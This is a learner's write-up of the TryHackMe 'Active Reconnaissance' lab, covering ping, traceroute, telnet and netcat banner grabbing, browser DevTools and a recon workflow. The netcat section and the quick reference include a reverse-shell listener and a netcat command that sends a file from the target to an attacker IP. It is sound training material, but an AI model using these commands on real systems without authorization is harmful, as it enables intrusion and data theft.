# TryHackMe — Active Reconnaissance

![TryHackMe](https://img.shields.io/badge/Platform-TryHackMe-212C42?style=flat&logo=tryhackme&logoColor=white)
![Path](https://img.shields.io/badge/Path-Jr%20Penetration%20Tester-red)
![Topic](https://img.shields.io/badge/Topic-Network%20Reconnaissance-blue)
![Status](https://img.shields.io/badge/Status-Completed-brightgreen)
![Date](https://img.shields.io/badge/Completed-June%202026-purple)

---

## Overview

| Field | Details |
|-------|---------|
| Platform | TryHackMe |
| Room | Active Reconnaissance |
| URL | tryhackme.com/room/activerecon |
| Path | Jr Penetration Tester → Network Reconnaissance |
| Tasks Completed | Task 1 — Task 7 (all, 100%) |
| Date Completed | June 2026 |

---

## Tasks Completed

| Task | Topic | Status |
|------|-------|--------|
| Task 1 | Introduction | ✅ Done |
| Task 2 | Web Browser | ✅ Done |
| Task 3 | Ping | ✅ Done |
| Task 4 | Traceroute | ✅ Done |
| Task 5 | Telnet | ✅ Done |
| Task 6 | Netcat | ✅ Done |
| Task 7 | Putting It All Together | ✅ Done |

---

## What is Active Reconnaissance?

Active reconnaissance means **directly interacting with the target system** to gather information. Unlike passive recon (Google, WHOIS, Shodan — no direct contact), active recon touches the target and can be detected.

**Key difference:**

| Type | Direct contact with target? | Detectable? | Examples |
|------|-----------------------------|-------------|---------|
| Passive recon | ❌ No | ❌ No | Google dorking, Shodan, WHOIS |
| Active recon | ✅ Yes | ✅ Yes | Nmap, Ping, Telnet, Netcat |

**Rule:** Active recon must only be performed on systems you have written permission to test.

---

## Task 2 — Web Browser as a Recon Tool

The browser is the most overlooked recon tool. Developer Tools reveal information that is invisible on the rendered page.

### What I did

I used browser Developer Tools to inspect target web pages and extract useful information before touching any other tool.

**Key Developer Tools tabs for recon:**

| Tab | What to look for |
|-----|-----------------|
| **Inspector / Elements** | Hidden HTML fields, commented-out code, disabled form fields, hidden divs |
| **Network** | All HTTP requests made by the page — APIs called, parameters sent, auth tokens in headers |
| **Console** | JavaScript errors that reveal file paths, internal URLs, and stack traces |
| **Storage** | Cookies (session tokens, flags, user roles), localStorage, sessionStorage |
| **Sources** | JavaScript files — sometimes contain hardcoded API keys, internal URLs, or developer comments |

**How to open:** `F12` or right-click → Inspect

### What I found during the room

- HTTP response headers revealed server software and version
- Page source contained commented-out code with internal paths
- Network tab showed API requests with parameters that could be manipulated
- Cookies contained session information worth examining for security issues

**What I learned:** The browser sees everything the server sends. Before running any tool, spend 5 minutes in Developer Tools — you often find information that Nmap and automated scanners completely miss.

---

## Task 3 — Ping

Ping uses ICMP Echo Request packets to check if a host is alive and measure round-trip time.

### Commands I used

```bash
# Basic ping — check if host is alive
ping 10.10.10.1

# Send exactly 5 packets then stop
ping -c 5 10.10.10.1

# Ping with specific packet size
ping -s 1000 10.10.10.1
```

### What the output tells you

```
PING 10.10.10.1 (10.10.10.1) 56(84) bytes of data.
64 bytes from 10.10.10.1: icmp_seq=1 ttl=64 time=0.432 ms

--- 10.10.10.1 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3051ms
rtt min/avg/max/mdev = 0.432/0.51/0.61/0.07 ms
```

| Field | What it means |
|-------|--------------|
| `ttl=64` | Linux/Unix host (TTL 64). Windows = 128. Network devices = 255 |
| `time=0.432 ms` | Round-trip time — useful for detecting if target is local or remote |
| `0% packet loss` | Host is reachable and responding |
| No response | Host is down OR firewall is blocking ICMP |

**What I learned:** TTL value reveals the operating system family without running a full scan. `ttl=64` = Linux, `ttl=128` = Windows. This is useful for deciding which tools and exploits to try next.

---

## Task 4 — Traceroute

Traceroute maps the network path between your machine and the target — showing every router (hop) in between.

### Commands I used

```bash
# Linux
traceroute 10.10.10.1

# Windows equivalent
tracert 10.10.10.1

# Use TCP instead of ICMP (bypasses some firewalls)
traceroute -T -p 80 10.10.10.1
```

### Sample output

```
traceroute to 10.10.10.1, 30 hops max
 1  192.168.1.1    1.2 ms   1.1 ms   1.0 ms    ← My router
 2  10.0.0.1       8.4 ms   8.2 ms   8.5 ms    ← ISP gateway
 3  * * *                                        ← Hop blocking ICMP
 4  10.10.10.1    15.3 ms  14.9 ms  15.1 ms    ← Target reached
```

**What `* * *` means:** That hop is blocking ICMP — the router exists but is not responding. This is normal on hardened networks.

**What I learned:** Traceroute reveals network topology. Seeing a firewall hop between you and the target tells you what kind of evasion might be needed. The number of hops also tells you whether the target is local (few hops) or across the internet (many hops).

---

## Task 5 — Telnet

Telnet opens a raw TCP connection to any port and lets you type commands directly. It is one of the most useful manual service interaction tools.

### Commands I used

```bash
# Connect to a web server on port 80
telnet 10.10.10.1 80

# After connecting — send a raw HTTP request
GET / HTTP/1.1
Host: 10.10.10.1
[press Enter twice]
```

### What I discovered using Telnet

**Banner grabbing** — many services announce their name and version when you connect:

```bash
telnet 10.10.10.1 21
# Response:
220 ProFTPD 1.3.5 Server (Debian) [::ffff:10.10.10.1]
# → FTP service, version 1.3.5, Debian Linux
```

```bash
telnet 10.10.10.1 25
# Response:
220 mail.target.com ESMTP Postfix (Ubuntu)
# → SMTP service, Postfix on Ubuntu
```

**HTTP headers via Telnet:**
```
GET / HTTP/1.1
Host: 10.10.10.1

HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)     ← Server software + version
X-Powered-By: PHP/7.4.3            ← Backend language + version
```

**What I learned:** Telnet proves that a service is actually running on a port — not just that the port is open. It also retrieves banner information that reveals software versions, which can then be searched for known CVEs. This is what `-sV` in Nmap does automatically, but doing it manually builds real understanding of how protocols work.

---

## Task 6 — Netcat

Netcat (`nc`) is the most versatile network tool for a pentester. It can connect to any TCP/UDP port, listen for incoming connections, and transfer files.

### Commands I used

```bash
# Connect to a port (like Telnet but more flexible)
nc 10.10.10.1 80

# Listen on a port (catch a reverse shell)
nc -lvnp 4444

# Banner grabbing
nc 10.10.10.1 22
# Response: SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3

# Transfer a file from target to attacker
# On attacker: nc -lvnp 4444 > received_file.txt
# On target:   nc 10.10.14.5 4444 < file_to_send.txt
```

### Netcat flags explained

| Flag | Meaning |
|------|---------|
| `-l` | Listen mode — wait for incoming connection |
| `-v` | Verbose — show connection details |
| `-n` | No DNS resolution — use IP addresses only |
| `-p` | Specify port number |
| `-u` | UDP mode (default is TCP) |

### Netcat vs Telnet

| | Telnet | Netcat |
|--|--------|--------|
| Protocol | TCP only | TCP and UDP |
| Direction | Client only | Client AND listener |
| File transfer | ❌ No | ✅ Yes |
| Shell catching | ❌ No | ✅ Yes |
| Banner grabbing | ✅ Yes | ✅ Yes |

**What I learned:** Netcat is the tool I will use constantly in CTFs and real pentests — for catching reverse shells, manual banner grabbing, and quick port testing. The listener command `nc -lvnp 4444` is something every pentester types from memory.

---

## Task 7 — Putting It All Together

In the final task I combined all tools in a realistic recon workflow against a target machine.

### My recon workflow

```
Step 1: ping target         → Is it alive? What OS family?
Step 2: traceroute target   → How many hops? Any firewalls in the path?
Step 3: nmap -sV target     → What ports are open? What services + versions?
Step 4: telnet target PORT  → Manually grab banners, confirm service behaviour
Step 5: nc target PORT      → Interact with services manually
Step 6: Browser DevTools    → Inspect web page for hidden info, headers, cookies
```

**Combined output from the room:**

| Tool | What I found |
|------|-------------|
| Ping | Host alive, TTL=64 (Linux) |
| Traceroute | 3 hops to target, no firewall blocking |
| Nmap | Port 22 (SSH), 80 (HTTP Apache), 21 (FTP ProFTPD) |
| Telnet port 80 | Apache 2.4.41, PHP 7.4.3 revealed in headers |
| Netcat port 21 | ProFTPD 1.3.5 — searchable for CVEs |
| Browser DevTools | Hidden admin path found in page source comment |

**What I learned:** Active recon is a layered process — each tool adds information that guides the next step. Ping tells you it's Linux → Nmap tells you what's running → Telnet/Netcat tells you the exact versions → DevTools finds what automated tools miss.

---

## Key Takeaways

- **Active recon directly touches the target** — always have written permission before running any of these tools against real systems
- **TTL value reveals OS family** — `ttl=64` = Linux/Unix, `ttl=128` = Windows. Know this without thinking
- **Banner grabbing is free intelligence** — many services announce their exact version on connection. That version number goes straight into CVE search
- **Netcat is the one tool I will always have** — it is pre-installed on Kali, works on every OS, and does more than most specialised tools
- **Browser DevTools finds what scanners miss** — comments in HTML, hidden fields, and API calls in the Network tab are invisible to Nmap but immediately visible in the browser

---

## Quick Reference

```bash
ping -c 4 TARGET              # Host alive check + OS guess via TTL
traceroute TARGET             # Map network path
nmap -sV -sC TARGET           # Port scan + service versions + default scripts
telnet TARGET PORT            # Manual service connection + banner grab
nc TARGET PORT                # Same as telnet but more capable
nc -lvnp 4444                 # Listen for reverse shell
```

---

## Resources

- [Nmap Book (free)](https://nmap.org/book/)
- [Netcat manual](https://linux.die.net/man/1/nc)
- [Mozilla Developer Tools docs](https://developer.mozilla.org/en-US/docs/Tools)

---

## My Progress

- [x] Active Reconnaissance ← *this writeup*
- [x] Protocols and Servers
- [ ] Nmap Advanced rooms (nmap03, nmap04)
- [ ] Network Services rooms

---

*Part of my 6-month cybersecurity portfolio — [github.com/shehrozmajeed](https://github.com/shehrozmajeed)*
